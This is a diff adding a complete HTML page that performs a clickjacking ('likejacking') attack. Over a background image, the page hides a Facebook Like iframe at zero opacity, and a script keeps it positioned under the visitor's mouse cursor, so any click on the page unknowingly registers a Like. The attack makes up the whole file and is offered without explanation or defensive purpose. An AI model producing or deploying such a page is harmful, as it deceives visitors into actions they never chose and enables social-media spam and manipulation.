@@ -1,0 +1,49 @@
+<html>
+<head>
+<style type="text/css"> 
+
+body {
+	background-image: url(play.jpg);
+}
+</style>
+</head>
+<body>
+  
+  
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; opacity: 0; top: 152px; left: 1227px; " id="icontainer"> 
+<!--facebook like frame code goes here-->
+         <iframe src="https://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fplus.google.com&layout=standard&show_faces=true&width=450&action=like&colorscheme=light&height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowtransparency="true" id="fbframe" name="fbframe"></iframe>
+
+      <!--end facebook like frame code-->
+
+    </div>
+    
+    
+   <script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');    
+    var standardbody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body //create reference to common "body" across doctypes
+    
+    
+    
+    function mouseFollower(e){
+     
+    if (window.event) 
+    { // for IE
+        icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px';
+        icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px';
+    } 
+    else 
+    {
+        icontainer.style.top = (e.pageY-5)+'px';
+        icontainer.style.left = (e.pageX-5)+'px';
+    }
+
+    }
+    document.onmousemove = function(e) {
+        if (iflag == 0) {mouseFollower(e);}
+    }
+
+    </script>
+</body>
+</html>
